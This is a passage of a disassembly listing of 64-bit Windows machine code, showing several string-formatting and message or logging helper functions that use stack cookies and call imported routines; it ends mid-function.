   14000262a:	e8 21 a2 00 00       	call   0x14000c850
   14000262f:	48 2b e0             	sub    %rax,%rsp
   140002632:	48 8b 05 07 ba 03 00 	mov    0x3ba07(%rip),%rax        # 0x14003e040
   140002639:	48 33 c4             	xor    %rsp,%rax
   14000263c:	48 89 84 24 20 20 00 	mov    %rax,0x2020(%rsp)
   140002643:	00 
   140002644:	49 8b f0             	mov    %r8,%rsi
   140002647:	48 63 da             	movslq %edx,%rbx
   14000264a:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140002650:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002655:	49 8b e9             	mov    %r9,%rbp
   140002658:	48 8b f9             	mov    %rcx,%rdi
   14000265b:	e8 30 6d 00 00       	call   0x140009390
   140002660:	44 8b 8c 24 80 20 00 	mov    0x2080(%rsp),%r9d
   140002667:	00 
   140002668:	33 c9                	xor    %ecx,%ecx
   14000266a:	48 85 c0             	test   %rax,%rax
   14000266d:	74 14                	je     0x140002683
   14000266f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002674:	4c 8b c6             	mov    %rsi,%r8
   140002677:	48 8d 14 5a          	lea    (%rdx,%rbx,2),%rdx
   14000267b:	ff 15 97 8d 02 00    	call   *0x28d97(%rip)        # 0x14002b418
   140002681:	eb 0d                	jmp    0x140002690
   140002683:	48 8d 14 3b          	lea    (%rbx,%rdi,1),%rdx
   140002687:	4c 8b c5             	mov    %rbp,%r8
   14000268a:	ff 15 90 8d 02 00    	call   *0x28d90(%rip)        # 0x14002b420
   140002690:	48 8b 8c 24 20 20 00 	mov    0x2020(%rsp),%rcx
   140002697:	00 
   140002698:	48 33 cc             	xor    %rsp,%rcx
   14000269b:	e8 b0 9e 00 00       	call   0x14000c550
   1400026a0:	48 81 c4 38 20 00 00 	add    $0x2038,%rsp
   1400026a7:	5f                   	pop    %rdi
   1400026a8:	5e                   	pop    %rsi
   1400026a9:	5d                   	pop    %rbp
   1400026aa:	5b                   	pop    %rbx
   1400026ab:	c3                   	ret
   1400026ac:	cc                   	int3
   1400026ad:	cc                   	int3
   1400026ae:	cc                   	int3
   1400026af:	cc                   	int3
   1400026b0:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400026b5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400026ba:	53                   	push   %rbx
   1400026bb:	55                   	push   %rbp
   1400026bc:	56                   	push   %rsi
   1400026bd:	57                   	push   %rdi
   1400026be:	48 83 ec 38          	sub    $0x38,%rsp
   1400026c2:	49 8b f0             	mov    %r8,%rsi
   1400026c5:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   1400026ca:	48 8b da             	mov    %rdx,%rbx
   1400026cd:	48 8b f9             	mov    %rcx,%rdi
   1400026d0:	e8 6b e9 ff ff       	call   0x140001040
   1400026d5:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   1400026da:	4c 8b ce             	mov    %rsi,%r9
   1400026dd:	4c 8b c3             	mov    %rbx,%r8
   1400026e0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400026e7:	00 00 
   1400026e9:	48 8b d7             	mov    %rdi,%rdx
   1400026ec:	48 8b 08             	mov    (%rax),%rcx
   1400026ef:	48 83 c9 01          	or     $0x1,%rcx
   1400026f3:	e8 e0 24 01 00       	call   0x140014bd8
   1400026f8:	85 c0                	test   %eax,%eax
   1400026fa:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   1400026ff:	0f 48 c1             	cmovs  %ecx,%eax
   140002702:	48 83 c4 38          	add    $0x38,%rsp
   140002706:	5f                   	pop    %rdi
   140002707:	5e                   	pop    %rsi
   140002708:	5d                   	pop    %rbp
   140002709:	5b                   	pop    %rbx
   14000270a:	c3                   	ret
   14000270b:	cc                   	int3
   14000270c:	cc                   	int3
   14000270d:	cc                   	int3
   14000270e:	cc                   	int3
   14000270f:	cc                   	int3
   140002710:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002715:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000271a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000271f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002724:	53                   	push   %rbx
   140002725:	55                   	push   %rbp
   140002726:	56                   	push   %rsi
   140002727:	57                   	push   %rdi
   140002728:	41 56                	push   %r14
   14000272a:	b8 40 10 00 00       	mov    $0x1040,%eax
   14000272f:	e8 1c a1 00 00       	call   0x14000c850
   140002734:	48 2b e0             	sub    %rax,%rsp
   140002737:	48 8b 05 02 b9 03 00 	mov    0x3b902(%rip),%rax        # 0x14003e040
   14000273e:	48 33 c4             	xor    %rsp,%rax
   140002741:	48 89 84 24 30 10 00 	mov    %rax,0x1030(%rsp)
   140002748:	00 
   140002749:	48 8b e9             	mov    %rcx,%rbp
   14000274c:	4c 8d b4 24 78 10 00 	lea    0x1078(%rsp),%r14
   140002753:	00 
   140002754:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002759:	bb 00 10 00 00       	mov    $0x1000,%ebx
   14000275e:	33 f6                	xor    %esi,%esi
   140002760:	e8 9b 2a 01 00       	call   0x140015200
   140002765:	44 8b c8             	mov    %eax,%r9d
   140002768:	4c 8d 05 c9 94 02 00 	lea    0x294c9(%rip),%r8        # 0x14002bc38
   14000276f:	48 8d 05 a2 95 02 00 	lea    0x295a2(%rip),%rax        # 0x14002bd18
   140002776:	8b d3                	mov    %ebx,%edx
   140002778:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000277d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002782:	e8 f9 f4 ff ff       	call   0x140001c80
   140002787:	85 c0                	test   %eax,%eax
   140002789:	78 19                	js     0x1400027a4
   14000278b:	48 63 c8             	movslq %eax,%rcx
   14000278e:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002793:	8b f0                	mov    %eax,%esi
   140002795:	48 03 f9             	add    %rcx,%rdi
   140002798:	2b d8                	sub    %eax,%ebx
   14000279a:	b8 00 00 00 00       	mov    $0x0,%eax
   14000279f:	0f 49 c3             	cmovns %ebx,%eax
   1400027a2:	8b d8                	mov    %eax,%ebx
   1400027a4:	48 63 db             	movslq %ebx,%rbx
   1400027a7:	e8 94 e8 ff ff       	call   0x140001040
   1400027ac:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   1400027b1:	4c 8b cd             	mov    %rbp,%r9
   1400027b4:	4c 8b c3             	mov    %rbx,%r8
   1400027b7:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400027be:	00 00 
   1400027c0:	48 8b d7             	mov    %rdi,%rdx
   1400027c3:	48 8b 08             	mov    (%rax),%rcx
   1400027c6:	48 83 c9 02          	or     $0x2,%rcx
   1400027ca:	e8 b5 21 01 00       	call   0x140014984
   1400027cf:	4c 8d 0d 4a 95 02 00 	lea    0x2954a(%rip),%r9        # 0x14002bd20
   1400027d6:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400027dd:	00 
   1400027de:	4c 8d 05 53 95 02 00 	lea    0x29553(%rip),%r8        # 0x14002bd38
   1400027e5:	8b d6                	mov    %esi,%edx
   1400027e7:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400027ec:	e8 2f fe ff ff       	call   0x140002620
   1400027f1:	48 8b 8c 24 30 10 00 	mov    0x1030(%rsp),%rcx
   1400027f8:	00 
   1400027f9:	48 33 cc             	xor    %rsp,%rcx
   1400027fc:	e8 4f 9d 00 00       	call   0x14000c550
   140002801:	48 81 c4 40 10 00 00 	add    $0x1040,%rsp
   140002808:	41 5e                	pop    %r14
   14000280a:	5f                   	pop    %rdi
   14000280b:	5e                   	pop    %rsi
   14000280c:	5d                   	pop    %rbp
   14000280d:	5b                   	pop    %rbx
   14000280e:	c3                   	ret
   14000280f:	cc                   	int3
   140002810:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002815:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000281a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000281f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002824:	53                   	push   %rbx
   140002825:	55                   	push   %rbp
   140002826:	56                   	push   %rsi
   140002827:	57                   	push   %rdi
   140002828:	41 56                	push   %r14
   14000282a:	b8 40 20 00 00       	mov    $0x2040,%eax
   14000282f:	e8 1c a0 00 00       	call   0x14000c850
   140002834:	48 2b e0             	sub    %rax,%rsp
   140002837:	48 8b 05 02 b8 03 00 	mov    0x3b802(%rip),%rax        # 0x14003e040
   14000283e:	48 33 c4             	xor    %rsp,%rax
   140002841:	48 89 84 24 30 20 00 	mov    %rax,0x2030(%rsp)
   140002848:	00 
   140002849:	48 8b e9             	mov    %rcx,%rbp
   14000284c:	4c 8d b4 24 78 20 00 	lea    0x2078(%rsp),%r14
   140002853:	00 
   140002854:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002859:	bb 00 10 00 00       	mov    $0x1000,%ebx
   14000285e:	33 f6                	xor    %esi,%esi
   140002860:	e8 9b 29 01 00       	call   0x140015200
   140002865:	44 8b c8             	mov    %eax,%r9d
   140002868:	4c 8d 05 d9 93 02 00 	lea    0x293d9(%rip),%r8        # 0x14002bc48
   14000286f:	48 8d 05 e2 94 02 00 	lea    0x294e2(%rip),%rax        # 0x14002bd58
   140002876:	8b d3                	mov    %ebx,%edx
   140002878:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000287d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002882:	e8 29 fe ff ff       	call   0x1400026b0
   140002887:	85 c0                	test   %eax,%eax
   140002889:	78 1a                	js     0x1400028a5
   14000288b:	48 63 c8             	movslq %eax,%rcx
   14000288e:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002893:	2b d8                	sub    %eax,%ebx
   140002895:	8b f0                	mov    %eax,%esi
   140002897:	b8 00 00 00 00       	mov    $0x0,%eax
   14000289c:	0f 49 c3             	cmovns %ebx,%eax
   14000289f:	48 8d 3c 4f          	lea    (%rdi,%rcx,2),%rdi
   1400028a3:	8b d8                	mov    %eax,%ebx
   1400028a5:	48 63 db             	movslq %ebx,%rbx
   1400028a8:	e8 93 e7 ff ff       	call   0x140001040
   1400028ad:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   1400028b2:	4c 8b cd             	mov    %rbp,%r9
   1400028b5:	4c 8b c3             	mov    %rbx,%r8
   1400028b8:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400028bf:	00 00 
   1400028c1:	48 8b d7             	mov    %rdi,%rdx
   1400028c4:	48 8b 08             	mov    (%rax),%rcx
   1400028c7:	48 83 c9 01          	or     $0x1,%rcx
   1400028cb:	e8 08 23 01 00       	call   0x140014bd8
   1400028d0:	8b c6                	mov    %esi,%eax
   1400028d2:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400028d7:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   1400028dd:	4c 8d 05 54 94 02 00 	lea    0x29454(%rip),%r8        # 0x14002bd38
   1400028e4:	33 c9                	xor    %ecx,%ecx
   1400028e6:	48 8d 14 42          	lea    (%rdx,%rax,2),%rdx
   1400028ea:	ff 15 28 8b 02 00    	call   *0x28b28(%rip)        # 0x14002b418
   1400028f0:	48 8b 8c 24 30 20 00 	mov    0x2030(%rsp),%rcx
   1400028f7:	00 
   1400028f8:	48 33 cc             	xor    %rsp,%rcx
   1400028fb:	e8 50 9c 00 00       	call   0x14000c550
   140002900:	48 81 c4 40 20 00 00 	add    $0x2040,%rsp
   140002907:	41 5e                	pop    %r14
   140002909:	5f                   	pop    %rdi
   14000290a:	5e                   	pop    %rsi
   14000290b:	5d                   	pop    %rbp
   14000290c:	5b                   	pop    %rbx
   14000290d:	c3                   	ret
   14000290e:	cc                   	int3
   14000290f:	cc                   	int3
   140002910:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140002915:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000291a:	53                   	push   %rbx
   14000291b:	55                   	push   %rbp
   14000291c:	56                   	push   %rsi
   14000291d:	57                   	push   %rdi
   14000291e:	41 54                	push   %r12
   140002920:	41 55                	push   %r13
   140002922:	41 56                	push   %r14
   140002924:	41 57                	push   %r15
   140002926:	b8 48 10 00 00       	mov    $0x1048,%eax
   14000292b:	e8 20 9f 00 00       	call   0x14000c850
   140002930:	48 2b e0             	sub    %rax,%rsp
   140002933:	48 8b 05 06 b7 03 00 	mov    0x3b706(%rip),%rax        # 0x14003e040
   14000293a:	48 33 c4             	xor    %rsp,%rax
   14000293d:	48 89 84 24 30 10 00 	mov    %rax,0x1030(%rsp)
   140002944:	00 
   140002945:	45 33 ed             	xor    %r13d,%r13d
   140002948:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
   14000294d:	41 8b ed             	mov    %r13d,%ebp
   140002950:	4d 8b f0             	mov    %r8,%r14
   140002953:	44 8b e2             	mov    %edx,%r12d
   140002956:	4c 8b f9             	mov    %rcx,%r15
   140002959:	bf 00 10 00 00       	mov    $0x1000,%edi
   14000295e:	e8 9d 28 01 00       	call   0x140015200
   140002963:	44 8b c8             	mov    %eax,%r9d
   140002966:	4c 8d 05 fb 92 02 00 	lea    0x292fb(%rip),%r8        # 0x14002bc68
   14000296d:	8b d7                	mov    %edi,%edx
   14000296f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002974:	e8 07 f3 ff ff       	call   0x140001c80
   140002979:	85 c0                	test   %eax,%eax
   14000297b:	78 17                	js     0x140002994
   14000297d:	48 63 c8             	movslq %eax,%rcx
   140002980:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
   140002985:	8b e8                	mov    %eax,%ebp
   140002987:	48 03 f1             	add    %rcx,%rsi
   14000298a:	2b f8                	sub    %eax,%edi
   14000298c:	41 8b c5             	mov    %r13d,%eax
   14000298f:	0f 49 c7             	cmovns %edi,%eax
   140002992:	8b f8                	mov    %eax,%edi
   140002994:	48 63 df             	movslq %edi,%rbx
   140002997:	e8 a4 e6 ff ff       	call   0x140001040
   14000299c:	4d 8b ce             	mov    %r14,%r9
   14000299f:	4c 8b c3             	mov    %rbx,%r8
   1400029a2:	48 8b d6             	mov    %rsi,%rdx
   1400029a5:	48 8b 08             	mov    (%rax),%rcx
   1400029a8:	48 8d 84 24 a8 10 00 	lea    0x10a8(%rsp),%rax
   1400029af:	00 
   1400029b0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400029b5:	48 83 c9 02          	or     $0x2,%rcx
   1400029b9:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   1400029be:	e8 c1 1f 01 00       	call   0x140014984
   1400029c3:	85 c0                	test   %eax,%eax
   1400029c5:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   1400029ca:	0f 48 c1             	cmovs  %ecx,%eax
   1400029cd:	85 c0                	test   %eax,%eax
   1400029cf:	78 0c                	js     0x1400029dd
   1400029d1:	48 63 d0             	movslq %eax,%rdx
   1400029d4:	48 03 f2             	add    %rdx,%rsi
   1400029d7:	2b f8                	sub    %eax,%edi
   1400029d9:	41 0f 48 fd          	cmovs  %r13d,%edi
   1400029dd:	41 8b cc             	mov    %r12d,%ecx
   1400029e0:	e8 7b 27 01 00       	call   0x140015160
   1400029e5:	48 63 d7             	movslq %edi,%rdx
   1400029e8:	4c 8d 05 89 92 02 00 	lea    0x29289(%rip),%r8        # 0x14002bc78
   1400029ef:	4d 8b cf             	mov    %r15,%r9
   1400029f2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400029f7:	48 8b ce             	mov    %rsi,%rcx
   1400029fa:	e8 81 f2 ff ff       	call   0x140001c80
   1400029ff:	4c 8d 0d 1a 93 02 00 	lea    0x2931a(%rip),%r9        # 0x14002bd20
   140002a06:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140002a0d:	00 
   140002a0e:	4c 8d 05 23 93 02 00 	lea    0x29323(%rip),%r8        # 0x14002bd38
   140002a15:	8b d5                	mov    %ebp,%edx
   140002a17:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002a1c:	e8 ff fb ff ff       	call   0x140002620
   140002a21:	48 8b 8c 24 30 10 00 	mov    0x1030(%rsp),%rcx
   140002a28:	00 
   140002a29:	48 33 cc             	xor    %rsp,%rcx
   140002a2c:	e8 1f 9b 00 00       	call   0x14000c550
   140002a31:	48 81 c4 48 10 00 00 	add    $0x1048,%rsp
   140002a38:	41 5f                	pop    %r15
   140002a3a:	41 5e                	pop    %r14
   140002a3c:	41 5d                	pop    %r13
   140002a3e:	41 5c                	pop    %r12
   140002a40:	5f                   	pop    %rdi
   140002a41:	5e                   	pop    %rsi
   140002a42:	5d                   	pop    %rbp
   140002a43:	5b                   	pop    %rbx
   140002a44:	c3                   	ret
   140002a45:	cc                   	int3
   140002a46:	cc                   	int3
   140002a47:	cc                   	int3
   140002a48:	cc                   	int3
   140002a49:	cc                   	int3
   140002a4a:	cc                   	int3
   140002a4b:	cc                   	int3
   140002a4c:	cc                   	int3
   140002a4d:	cc                   	int3
   140002a4e:	cc                   	int3
   140002a4f:	cc                   	int3
   140002a50:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002a55:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002a5a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140002a5f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002a64:	53                   	push   %rbx
   140002a65:	55                   	push   %rbp
   140002a66:	56                   	push   %rsi
   140002a67:	57                   	push   %rdi
   140002a68:	41 56                	push   %r14
   140002a6a:	b8 40 10 00 00       	mov    $0x1040,%eax
   140002a6f:	e8 dc 9d 00 00       	call   0x14000c850
   140002a74:	48 2b e0             	sub    %rax,%rsp
   140002a77:	48 8b 05 c2 b5 03 00 	mov    0x3b5c2(%rip),%rax        # 0x14003e040
   140002a7e:	48 33 c4             	xor    %rsp,%rax
   140002a81:	48 89 84 24 30 10 00 	mov    %rax,0x1030(%rsp)
   140002a88:	00 
   140002a89:	48 8b e9             	mov    %rcx,%rbp
   140002a8c:	4c 8d b4 24 78 10 00 	lea    0x1078(%rsp),%r14
   140002a93:	00 
   140002a94:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002a99:	bb 00 10 00 00       	mov    $0x1000,%ebx
   140002a9e:	33 f6                	xor    %esi,%esi
   140002aa0:	e8 5b 27 01 00       	call   0x140015200
   140002aa5:	44 8b c8             	mov    %eax,%r9d
   140002aa8:	4c 8d 05 89 91 02 00 	lea    0x29189(%rip),%r8        # 0x14002bc38
   140002aaf:	48 8d 05 32 92 02 00 	lea    0x29232(%rip),%rax        # 0x14002bce8
   140002ab6:	8b d3                	mov    %ebx,%edx
   140002ab8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002abd:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002ac2:	e8 b9 f1 ff ff       	call   0x140001c80
   140002ac7:	85 c0                	test   %eax,%eax
   140002ac9:	78 19                	js     0x140002ae4
   140002acb:	48 63 c8             	movslq %eax,%rcx
   140002ace:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002ad3:	8b f0                	mov    %eax,%esi
   140002ad5:	48 03 f9             	add    %rcx,%rdi
   140002ad8:	2b d8                	sub    %eax,%ebx
   140002ada:	b8 00 00 00 00       	mov    $0x0,%eax
   140002adf:	0f 49 c3             	cmovns %ebx,%eax
   140002ae2:	8b d8                	mov    %eax,%ebx
   140002ae4:	48 63 db             	movslq %ebx,%rbx
   140002ae7:	e8 54 e5 ff ff       	call   0x140001040
   140002aec:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140002af1:	4c 8b cd             	mov    %rbp,%r9
   140002af4:	4c 8b c3             	mov    %rbx,%r8
   140002af7:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002afe:	00 00 
   140002b00:	48 8b d7             	mov    %rdi,%rdx
   140002b03:	48 8b 08             	mov    (%rax),%rcx
   140002b06:	48 83 c9 02          	or     $0x2,%rcx
   140002b0a:	e8 75 1e 01 00       	call   0x140014984
   140002b0f:	4c 8d 0d da 91 02 00 	lea    0x291da(%rip),%r9        # 0x14002bcf0
   140002b16:	c7 44 24 20 30 00 00 	movl   $0x30,0x20(%rsp)
   140002b1d:	00 
   140002b1e:	4c 8d 05 e3 91 02 00 	lea    0x291e3(%rip),%r8        # 0x14002bd08
   140002b25:	8b d6                	mov    %esi,%edx
   140002b27:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002b2c:	e8 ef fa ff ff       	call   0x140002620
   140002b31:	48 8b 8c 24 30 10 00 	mov    0x1030(%rsp),%rcx
   140002b38:	00 
   140002b39:	48 33 cc             	xor    %rsp,%rcx
   140002b3c:	e8 0f 9a 00 00       	call   0x14000c550
   140002b41:	48 81 c4 40 10 00 00 	add    $0x1040,%rsp
   140002b48:	41 5e                	pop    %r14
   140002b4a:	5f                   	pop    %rdi
   140002b4b:	5e                   	pop    %rsi
   140002b4c:	5d                   	pop    %rbp
   140002b4d:	5b                   	pop    %rbx
   140002b4e:	c3                   	ret
   140002b4f:	cc                   	int3
   140002b50:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002b55:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002b5a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140002b5f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002b64:	53                   	push   %rbx
   140002b65:	55                   	push   %rbp
   140002b66:	56                   	push   %rsi
   140002b67:	57                   	push   %rdi
   140002b68:	41 56                	push   %r14
   140002b6a:	b8 40 20 00 00       	mov    $0x2040,%eax
   140002b6f:	e8 dc 9c 00 00       	call   0x14000c850
   140002b74:	48 2b e0             	sub    %rax,%rsp
   140002b77:	48 8b 05 c2 b4 03 00 	mov    0x3b4c2(%rip),%rax        # 0x14003e040
   140002b7e:	48 33 c4             	xor    %rsp,%rax
   140002b81:	48 89 84 24 30 20 00 	mov    %rax,0x2030(%rsp)
   140002b88:	00 
   140002b89:	48 8b e9             	mov    %rcx,%rbp
   140002b8c:	4c 8d b4 24 78 20 00 	lea    0x2078(%rsp),%r14
   140002b93:	00 
   140002b94:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002b99:	bb 00 10 00 00       	mov    $0x1000,%ebx
   140002b9e:	33 f6                	xor    %esi,%esi
   140002ba0:	e8 5b 26 01 00       	call   0x140015200
   140002ba5:	44 8b c8             	mov    %eax,%r9d
   140002ba8:	4c 8d 05 99 90 02 00 	lea    0x29099(%rip),%r8        # 0x14002bc48
   140002baf:	48 8d 05 92 91 02 00 	lea    0x29192(%rip),%rax        # 0x14002bd48
   140002bb6:	8b d3                	mov    %ebx,%edx
   140002bb8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002bbd:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002bc2:	e8 e9 fa ff ff       	call   0x1400026b0
   140002bc7:	85 c0                	test   %eax,%eax
   140002bc9:	78 1a                	js     0x140002be5
   140002bcb:	48 63 c8             	movslq %eax,%rcx
   140002bce:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002bd3:	2b d8                	sub    %eax,%ebx
   140002bd5:	8b f0                	mov    %eax,%esi
   140002bd7:	b8 00 00 00 00       	mov    $0x0,%eax
   140002bdc:	0f 49 c3             	cmovns %ebx,%eax
   140002bdf:	48 8d 3c 4f          	lea    (%rdi,%rcx,2),%rdi
   140002be3:	8b d8                	mov    %eax,%ebx
   140002be5:	48 63 db             	movslq %ebx,%rbx
   140002be8:	e8 53 e4 ff ff       	call   0x140001040
   140002bed:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140002bf2:	4c 8b cd             	mov    %rbp,%r9
   140002bf5:	4c 8b c3             	mov    %rbx,%r8
   140002bf8:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002bff:	00 00 
   140002c01:	48 8b d7             	mov    %rdi,%rdx
   140002c04:	48 8b 08             	mov    (%rax),%rcx
   140002c07:	48 83 c9 01          	or     $0x1,%rcx
   140002c0b:	e8 c8 1f 01 00       	call   0x140014bd8
   140002c10:	8b c6                	mov    %esi,%eax
   140002c12:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002c17:	41 b9 30 00 00 00    	mov    $0x30,%r9d
   140002c1d:	4c 8d 05 e4 90 02 00 	lea    0x290e4(%rip),%r8        # 0x14002bd08
   140002c24:	33 c9                	xor    %ecx,%ecx
   140002c26:	48 8d 14 42          	lea    (%rdx,%rax,2),%rdx
   140002c2a:	ff 15 e8 87 02 00    	call   *0x287e8(%rip)        # 0x14002b418
   140002c30:	48 8b 8c 24 30 20 00 	mov    0x2030(%rsp),%rcx
   140002c37:	00 
   140002c38:	48 33 cc             	xor    %rsp,%rcx
   140002c3b:	e8 10 99 00 00       	call   0x14000c550
   140002c40:	48 81 c4 40 20 00 00 	add    $0x2040,%rsp
   140002c47:	41 5e                	pop    %r14
   140002c49:	5f                   	pop    %rdi
   140002c4a:	5e                   	pop    %rsi
   140002c4b:	5d                   	pop    %rbp
   140002c4c:	5b                   	pop    %rbx
   140002c4d:	c3                   	ret
   140002c4e:	cc                   	int3
   140002c4f:	cc                   	int3
   140002c50:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140002c55:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002c5a:	53                   	push   %rbx
   140002c5b:	55                   	push   %rbp
   140002c5c:	56                   	push   %rsi
   140002c5d:	57                   	push   %rdi
   140002c5e:	41 54                	push   %r12
   140002c60:	41 55                	push   %r13
   140002c62:	41 56                	push   %r14
   140002c64:	41 57                	push   %r15
   140002c66:	b8 58 20 00 00       	mov    $0x2058,%eax
   140002c6b:	e8 e0 9b 00 00       	call   0x14000c850
   140002c70:	48 2b e0             	sub    %rax,%rsp
   140002c73:	48 8b 05 c6 b3 03 00 	mov    0x3b3c6(%rip),%rax        # 0x14003e040
   140002c7a:	48 33 c4             	xor    %rsp,%rax
   140002c7d:	48 89 84 24 40 20 00 	mov    %rax,0x2040(%rsp)
   140002c84:	00 
   140002c85:	45 33 ed             	xor    %r13d,%r13d
   140002c88:	48 8d 74 24 40       	lea    0x40(%rsp),%rsi
   140002c8d:	41 8b ed             	mov    %r13d,%ebp
   140002c90:	4d 8b f8             	mov    %r8,%r15
   140002c93:	44 8b e2             	mov    %edx,%r12d
   140002c96:	4c 8b f1             	mov    %rcx,%r14
   140002c99:	bf 00 10 00 00       	mov    $0x1000,%edi
   140002c9e:	e8 5d 25 01 00       	call   0x140015200
   140002ca3:	44 8b c8             	mov    %eax,%r9d
   140002ca6:	4c 8d 05 d3 8f 02 00 	lea    0x28fd3(%rip),%r8        # 0x14002bc80
   140002cad:	8b d7                	mov    %edi,%edx
   140002caf:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002cb4:	e8 f7 f9 ff ff       	call   0x1400026b0
   140002cb9:	85 c0                	test   %eax,%eax
   140002cbb:	78 18                	js     0x140002cd5
   140002cbd:	48 63 c8             	movslq %eax,%rcx
   140002cc0:	48 8d 74 24 40       	lea    0x40(%rsp),%rsi
   140002cc5:	8b e8                	mov    %eax,%ebp
   140002cc7:	48 8d 34 4e          	lea    (%rsi,%rcx,2),%rsi
   140002ccb:	8b cf                	mov    %edi,%ecx
   140002ccd:	2b c8                	sub    %eax,%ecx
   140002ccf:	41 8b fd             	mov    %r13d,%edi
   140002cd2:	0f 49 f9             	cmovns %ecx,%edi
   140002cd5:	48 63 df             	movslq %edi,%rbx
   140002cd8:	e8 63 e3 ff ff       	call   0x140001040
   140002cdd:	4d 8b cf             	mov    %r15,%r9
   140002ce0:	4c 8b c3             	mov    %rbx,%r8
   140002ce3:	48 8b d6             	mov    %rsi,%rdx
   140002ce6:	48 8b 08             	mov    (%rax),%rcx
   140002ce9:	48 8d 84 24 b8 20 00 	lea    0x20b8(%rsp),%rax
   140002cf0:	00 
   140002cf1:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002cf6:	48 83 c9 01          	or     $0x1,%rcx
   140002cfa:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140002cff:	e8 d4 1e 01 00       	call   0x140014bd8
   140002d04:	85 c0                	test   %eax,%eax
   140002d06:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140002d0b:	0f 48 c1             	cmovs  %ecx,%eax
   140002d0e:	85 c0                	test   %eax,%eax
   140002d10:	78 0d                	js     0x140002d1f
   140002d12:	48 63 c8             	movslq %eax,%rcx
   140002d15:	2b f8                	sub    %eax,%edi
   140002d17:	41 0f 48 fd          	cmovs  %r13d,%edi
   140002d1b:	48 8d 34 4e          	lea    (%rsi,%rcx,2),%rsi
   140002d1f:	48 63 d7             	movslq %edi,%rdx
   140002d22:	4c 8d 05 77 8f 02 00 	lea    0x28f77(%rip),%r8        # 0x14002bca0
   140002d29:	4d 8b ce             	mov    %r14,%r9
   140002d2c:	48 8b ce             	mov    %rsi,%rcx
   140002d2f:	e8 7c f9 ff ff       	call   0x1400026b0
   140002d34:	85 c0                	test   %eax,%eax
   140002d36:	78 0d                	js     0x140002d45
   140002d38:	48 63 c8             	movslq %eax,%rcx
   140002d3b:	2b f8                	sub    %eax,%edi
   140002d3d:	41 0f 48 fd          	cmovs  %r13d,%edi
   140002d41:	48 8d 34 4e          	lea    (%rsi,%rcx,2),%rsi
   140002d45:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
